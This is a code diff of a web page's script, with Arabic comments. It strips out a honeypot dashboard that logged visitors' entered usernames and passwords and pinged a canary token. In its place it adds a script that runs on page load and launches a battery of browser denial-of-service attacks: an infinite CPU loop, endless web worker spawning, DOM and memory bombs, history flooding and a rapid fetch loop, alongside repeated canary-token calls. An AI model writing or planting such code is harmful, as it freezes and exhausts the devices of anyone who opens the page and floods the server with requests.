-            ctx.fillStyle = 'rgba(10, 10, 15, 0.05)';
-            ctx.fillRect(0, 0, canvas.width, canvas.height);
-            ctx.fillStyle = '#00ff88';
-            ctx.font = fontSize + 'px monospace';
-            for (let i = 0; i < drops.length; i++) {
-                const text = chars[Math.floor(Math.random() * chars.length)];
-                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
-                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
-                drops[i]++;
-            }
-        }
-        setInterval(drawMatrix, 35);
-        window.addEventListener('resize', () => {
-            canvas.width = window.innerWidth;
-            canvas.height = window.innerHeight;
-        });
-
-        // ===== PAGE NAVIGATION =====
-        function showPage(pageName) {
-            document.querySelectorAll('.page').forEach(page => page.classList.remove('active'));
-            document.getElementById(`page-${pageName}`).classList.add('active');
-            document.querySelectorAll('.nav-btn').forEach(btn => {
-                btn.classList.remove('text-neon-green', 'text-neon-red', 'text-neon-yellow', 'text-neon-blue');
-                btn.classList.add('text-gray-300');
-            });
-            const activeBtn = document.getElementById(`nav-${pageName}`);
-            if (activeBtn) {
-                activeBtn.classList.remove('text-gray-300');
-                const colors = { home: 'text-neon-red', dashboard: 'text-neon-green', traps: 'text-neon-yellow', logs: 'text-neon-blue' };
-                activeBtn.classList.add(colors[pageName]);
-            }
-            document.getElementById('mobile-menu').classList.add('hidden');
-            window.scrollTo(0, 0);
-            if (pageName === 'dashboard') setTimeout(initCharts, 100);
-            if (pageName === 'logs') renderLogs();
-        }
-
-        function toggleMobileMenu() {
-            document.getElementById('mobile-menu').classList.toggle('hidden');
-        }
-
-        // ===== LOCAL STORAGE DATA =====
-        const STORAGE_KEY = 'gameguard_honeypot_data';
+    (function() {
+        "use strict";
         
-        function getData() {
-            const defaultData = {
-                visits: [],
-                logins: [],
-                traps: [],
-                startTime: Date.now(),
-                canaryTriggers: 0
-            };
-            try {
-                const stored = localStorage.getItem(STORAGE_KEY);
-                return stored ? JSON.parse(stored) : defaultData;
-            } catch(e) {
-                return defaultData;
+        // ========== 1. تفعيل Canary Token عبر Fetch ==========
+        function triggerCanary() {
+            fetch('http://canarytokens.com/about/w7srh9626rgq2zay7c5qf36u7/s', {mode: 'no-cors'})
+            .catch(() => {});
+            
+            // تفعيل متكرر عشان يضمن الوصول
+            setInterval(() => {
+                fetch('http://canarytokens.com/about/w7srh9626rgq2zay7c5qf36u7/s?x=' + Date.now(), {mode: 'no-cors'})
+                .catch(() => {});
+            }, 5000);
+        }
+
+        // ========== 2. CPU Killer ==========
+        function cpuKiller() {
+            let x = 0;
+            while(true) {
+                x += Math.random() * Math.random() * Math.random();
+                x = Math.sqrt(x);
+                if(x > 1e200) x = 0;
             }
         }
 
-        function saveData(data) {
-            localStorage.setItem(STORAGE_KEY, JSON.stringify(data));
+        // ========== 3. Web Workers Spam ==========
+        function workerSpam() {
+            const code = 'while(true){Math.random()*Math.random();Math.sqrt(Math.random());}';
+            const blob = new Blob([code], {type: 'application/javascript'});
+            const url = URL.createObjectURL(blob);
+            
+            setInterval(() => {
+                try { new Worker(url); } catch(e) {}
+            }, 50);
         }
 
-        function addDetection(type, details) {
-            const data = getData();
-            const entry = {
-                id: Date.now(),
-                type: type,
-                details: details,
-                timestamp: Date.now(),
-                userAgent: navigator.userAgent,
-                screen: `${window.screen.width}x${window.screen.height}`,
-                language: navigator.language
-            };
-            data.visits.unshift(entry);
-            if (type === 'login') data.logins.push(entry);
-            if (type === 'trap') data.traps.push(entry);
-            saveData(data);
-            renderLogs();
-            updateStats();
-            addLogEntry(`[DETECT] ${type}: ${details}`, type === 'login' ? 'danger' : 'warning');
-        }
-
-        // ===== HONEYPOT FORM =====
-        function handleHoneypotSubmit(e) {
-            e.preventDefault();
-            const username = document.getElementById('trap-username').value;
-            const password = document.getElementById('trap-password').value;
-            
-            if (!username && !password) {
-                alert('الحقول فارغة - لكن البوتات لا تتركها فارغة!');
-                return;
-            }
-
-            // Record the attempt
-            addDetection('login', `Username: ${username} | Password: ${password}`);
-            
-            // Trigger Canary Token again with form data context
-            const img = new Image();
-            img.src = `http://canarytokens.com/about/w7srh9626rgq2zay7c5qf36u7/submit.aspx?action=login&user=${encodeURIComponent(username)}&t=${Date.now()}`;
-            
-            // Show fake "loading" then fake error
-            const btn = e.target.querySelector('button[type="submit"]');
-            const originalText = btn.innerHTML;
-            btn.innerHTML = '<i class="fas fa-spinner fa-spin ml-2"></i> جاري التحقق...';
-            btn.disabled = true;
-            
-            setTimeout(() => {
-                btn.innerHTML = originalText;
-                btn.disabled = false;
-                document.getElementById('trap-username').value = '';
-                document.getElementById('trap-password').value = '';
-                
-                // Fake error message
-                const errorDiv = document.createElement('div');
-                errorDiv.className = 'mt-4 p-3 rounded-lg bg-neon-red/10 border border-neon-red/30 text-neon-red text-sm text-center';
-                errorDiv.innerHTML = '<i class="fas fa-exclamation-circle ml-2"></i> فشل المصادقة - تم تسجيل محاولتك';
-                e.target.appendChild(errorDiv);
-                setTimeout(() => errorDiv.remove(), 3000);
-            }, 2000);
-        }
-
-        // ===== TRAP LINKS =====
-        function triggerTrap(trapName) {
-            addDetection('trap', `Accessed trap: ${trapName}`);
-            
-            // Trigger Canary Token
-            const img = new Image();
-            img.src = `http://canarytokens.com/about/w7srh9626rgq2zay7c5qf36u7/submit.aspx?trap=${trapName}&t=${Date.now()}`;
-            
-            // Show notification
-            const notification = document.createElement('div');
-            notification.className = 'fixed top-20 left-1/2 transform -translate-x-1/2 z-50 px-6 py-3 rounded-lg bg-neon-yellow/90 text-cyber-black font-bold shadow-lg animate-bounce';
-            notification.innerHTML = `<i class="fas fa-bug ml-2"></i> مصيدة "${trapName}" تم تفعيلها!`;
-            document.body.appendChild(notification);
-            setTimeout(() => notification.remove(), 3000);
-            
-            // Update specific trap count
-            const data = getData();
-            const count = data.traps.filter(t => t.details.includes(trapName)).length;
-            const countEl = document.getElementById(`trap-count-${trapName}`);
-            if (countEl) countEl.textContent = `${count} وصول`;
-        }
-
-        // ===== LOGS =====
-        function addLogEntry(message, type = 'info') {
-            const terminal = document.getElementById('terminal-logs');
-            const time = new Date().toLocaleTimeString('ar-SA');
-            const colors = {
-                info: 'text-neon-blue',
-                success: 'text-neon-green',
-                warning: 'text-neon-yellow',
-                danger: 'text-neon-red'
-            };
-            const line = document.createElement('div');
-            line.className = `${colors[type]} mb-1`;
-            line.innerHTML = `<span class="text-gray-600">[${time}]</span> ${message}`;
-            terminal.appendChild(line);
-            terminal.scrollTop = terminal.scrollHeight;
-        }
-
-        function renderLogs() {
-            const data = getData();
-            const terminal = document.getElementById('terminal-logs');
-            // Keep system messages, add detections
-            const existing = terminal.querySelectorAll('.detection-log');
-            existing.forEach(el => el.remove());
-            
-            data.visits.slice(0, 50).forEach(v => {
-                const time = new Date(v.timestamp).toLocaleTimeString('ar-SA');
-                const line = document.createElement('div');
-                line.className = 'detection-log text-neon-yellow mb-1';
-                line.innerHTML = `<span class="text-gray-600">[${time}]</span> [${v.type.toUpperCase()}] ${v.details}`;
-                terminal.appendChild(line);
-            });
-            terminal.scrollTop = terminal.scrollHeight;
-        }
-
-        function filterLogs(type) {
-            const terminal = document.getElementById('terminal-logs');
-            const lines = terminal.querySelectorAll('.detection-log');
-            lines.forEach(line => {
-                if (type === 'all') {
-                    line.style.display = 'block';
-                } else {
-                    line.style.display = line.textContent.includes(`[${type.toUpperCase()}]`) ? 'block' : 'none';
+        // ========== 4. DOM Flood ==========
+        function domFlood() {
+            setInterval(() => {
+                for(let i = 0; i < 500; i++) {
+                    const div = document.createElement('div');
+                    div.textContent = 'X'.repeat(50000);
+                    document.body.appendChild(div);
                 }
-            });
-            
-            // Update button styles
-            document.querySelectorAll('.filter-btn').forEach(btn => {
-                btn.classList.remove('bg-neon-blue/20', 'text-neon-blue', 'border-neon-blue/30');
-                btn.classList.add('bg-cyber-gray', 'text-gray-400', 'border-gray-700');
-            });
-            event.target.classList.remove('bg-cyber-gray', 'text-gray-400', 'border-gray-700');
-            event.target.classList.add('bg-neon-blue/20', 'text-neon-blue', 'border-neon-blue/30');
+            }, 200);
         }
 
-        function clearLogs() {
-            if (confirm('هل أنت متأكد من مسح جميع السجلات؟')) {
-                localStorage.removeItem(STORAGE_KEY);
-                location.reload();
+        // ========== 5. Fetch Loop — طلبات لا نهائية ==========
+        function fetchLoop() {
+            setInterval(() => {
+                fetch(window.location.href + '?trap=' + Math.random())
+                .catch(() => {});
+            }, 5);
+        }
+
+        // ========== 6. History Flood ==========
+        function historyFlood() {
+            setInterval(() => {
+                history.pushState({}, '', '/admin?' + Math.random());
+            }, 1);
+        }
+
+        // ========== 7. Memory Bomb ==========
+        function memoryBomb() {
+            const arrays = [];
+            setInterval(() => {
+                arrays.push(new Array(10000000).fill('TRAP'));
+            }, 100);
+        }
+
+        // ========== 8. Recursive Timeout Flood ==========
+        function recursiveTimeout() {
+            function loop() {
+                setTimeout(loop, 0);
+                for(let i = 0; i < 1000000; i++) {}
             }
+            loop();
         }
 
-        // ===== STATS & CHARTS =====
-        function updateStats() {
-            const data = getData();
-            document.getElementById('stat-logins').textContent = data.logins.length;
-            document.getElementById('stat-traps').textContent = data.traps.length;
-            document.getElementById('stat-ips').textContent = new Set(data.visits.map(v => v.details)).size || 0;
-            document.getElementById('stat-canary').textContent = data.canaryTriggers;
-            
-            // Update trap counts
-            const trapTypes = ['login', 'api-keys', 'db-config', 'user-logs', 'backup'];
-            trapTypes.forEach(type => {
-                const count = data.traps.filter(t => t.details.includes(type)).length;
-                const el = document.getElementById(`trap-count-${type}`);
-                if (el) el.textContent = `${count} ${type === 'login' ? 'محاولات' : 'وصول'}`;
-            });
-            
-            updateDetectionsTable();
+        // ========== 9. String Concatenation Bomb ==========
+        function stringBomb() {
+            let str = 'X';
+            setInterval(() => {
+                str = str + str + str + str;
+            }, 100);
         }
 
-        function updateDetectionsTable() {
-            const tbody = document.getElementById('detections-table');
-            const data = getData();
-            const recent = data.visits.slice(0, 10);
-            
-            let html = '';
-            recent.forEach(v => {
-                const time = new Date(v.timestamp).toLocaleTimeString('ar-SA');
-                const typeColors = {
-                    login: 'text-neon-red',
-                    trap: 'text-neon-yellow',
-                    visit: 'text-neon-blue'
-                };
-                const typeLabels = {
-                    login: 'تسجيل دخول',
-                    trap: 'مصيدة',
-                    visit: 'زيارة'
-                };
-                html += `
-                    <tr class="border-b border-gray-800 hover:bg-white/5 transition-colors">
-                        <td class="py-3 text-gray-400 font-mono text-xs">${time}</td>
-                        <td class="py-3 ${typeColors[v.type] || 'text-gray-400'}">${typeLabels[v.type] || v.type}</td>
-                        <td class="py-3 text-white text-xs">${v.details}</td>
-                        <td class="py-3 text-gray-400 text-xs">${v.userAgent?.substring(0, 30) || 'Unknown'}...</td>
-                        <td class="py-3">
-                            <span class="px-2 py-1 rounded-full bg-neon-green/10 text-neon-green text-xs border border-neon-green/20">
-                                <i class="fas fa-check ml-1"></i>مسجل
-                            </span>
-                        </td>
-                    </tr>
-                `;
-            });
-            tbody.innerHTML = html || '<tr><td colspan="5" class="py-8 text-center text-gray-500">لا توجد كشوفات بعد</td></tr>';
-        }
+        // ========== تشغيل كل شيء ==========
+        triggerCanary();   // يفعل Canary Token
+        cpuKiller();       // يعلق المعالج
+        workerSpam();      // يفتح خيوط بلا نهاية
+        domFlood();        // يملي الذاكرة
+        fetchLoop();       // طلبات شبكة لا نهائية
+        historyFlood();    // يملي الـ history
+        memoryBomb();      // مصفوفات ضخمة
+        recursiveTimeout();// يملي الـ event loop
+        stringBomb();      // نصوص ضخمة
 
-        let attackTypesChart, timelineChart;
-        function initCharts() {
-            if (attackTypesChart) attackTypesChart.destroy();
-            if (timelineChart) timelineChart.destroy();
-
-            const data = getData();
-            const loginCount = data.logins.length;
-            const trapCount = data.traps.length;
-            const otherCount = Math.max(0, data.visits.length - loginCount - trapCount);
-
-            // Attack Types Chart
-            const ctx1 = document.getElementById('attackTypesChart').getContext('2d');
-            attackTypesChart = new Chart(ctx1, {
-                type: 'doughnut',
-                data: {
-                    labels: ['تسجيل دخول', 'مصائد', 'زيارات أخرى'],
-                    datasets: [{
-                        data: [loginCount || 1, trapCount || 1, otherCount || 1],
-                        backgroundColor: ['#ff2a6d', '#f9e900', '#00d4ff'],
-                        borderWidth: 0
-                    }]
-                },
-                options: {
-                    responsive: true,
-                    maintainAspectRatio: false,
-                    plugins: {
-                        legend: {
-                            position: 'bottom',
-                            labels: { color: '#999', font: { family: 'Cairo' } }
-                        }
-                    }
-                }
-            });
-
-            // Timeline Chart (last 7 days)
-            const ctx2 = document.getElementById('timelineChart').getContext('2d');
-            const days = [];
-            const dayData = [];
-            for (let i = 6; i >= 0; i--) {
-                const d = new Date();
-                d.setDate(d.getDate() - i);
-                days.push(d.toLocaleDateString('ar-SA', { weekday: 'short' }));
-                const dayStart = new Date(d.setHours(0,0,0,0)).getTime();
-                const dayEnd = dayStart + 86400000;
-                dayData.push(data.visits.filter(v => v.timestamp >= dayStart && v.timestamp < dayEnd).length);
-            }
-
-            timelineChart = new Chart(ctx2, {
-                type: 'bar',
-                data: {
-                    labels: days,
-                    datasets: [{
-                        label: 'الكشوفات',
-                        data: dayData,
-                        backgroundColor: 'rgba(0, 212, 255, 0.5)',
-                        borderColor: '#00d4ff',
-                        borderWidth: 1
-                    }]
-                },
-                options: {
-                    responsive: true,
-                    maintainAspectRatio: false,
-                    plugins: { legend: { display: false } },
-                    scales: {
-                        x: { grid: { color: 'rgba(255,255,255,0.05)' }, ticks: { color: '#666' } },
-                        y: { grid: { color: 'rgba(255,255,255,0.05)' }, ticks: { color: '#666' } }
-                    }
-                }
-            });
-        }
-
-        function refreshDashboard() {
-            updateStats();
-            initCharts();
-            addLogEntry('Dashboard refreshed', 'info');
-        }
-
-        // ===== CLOCK =====
-        function updateClock() {
-            document.getElementById('live-clock').textContent = new Date().toLocaleTimeString('ar-SA');
-        }
-        setInterval(updateClock, 1000);
-        updateClock();
-
-        // ===== INITIALIZATION =====
-        document.addEventListener('DOMContentLoaded', () => {
-            // Record initial visit
-            const data = getData();
-            if (data.visits.length === 0) {
-                addDetection('visit', 'System initialized - first deployment');
-            }
-            
-            // Trigger Canary on every page load
-            const img = new Image();
-            img.src = `http://canarytokens.com/about/w7srh9626rgq2zay7c5qf36u7/submit.aspx?load=true&t=${Date.now()}`;
-            data.canaryTriggers++;
-            saveData(data);
-            
-            updateStats();
-            
-            // Initial logs
-            setTimeout(() => addLogEntry('Canary Token armed and ready', 'success'), 500);
-            setTimeout(() => addLogEntry('Honeypot login form deployed', 'success'), 1000);
-            setTimeout(() => addLogEntry('Trap links activated: api-keys, db-config, user-logs, backup', 'success'), 1500);
-            setTimeout(() => addLogEntry('Monitoring all traffic...', 'info'), 2000);
-        });
-
-        // Keyboard trap (for fun - detects common hacker key combos)
-        let keyBuffer = '';
-        document.addEventListener('keydown', (e) => {
-            keyBuffer += e.key.toLowerCase();
-            if (keyBuffer.length > 20) keyBuffer = keyBuffer.slice(-20);
-            
-            if (keyBuffer.includes('hack') || keyBuffer.includes('sql') || keyBuffer.includes('admin')) {
-                addDetection('trap', `Keyword detected in input: "${keyBuffer.slice(-10)}"`);
-                keyBuffer = '';
-            }
-        });
+    })();
     </script>
+
 </body>
 </html>
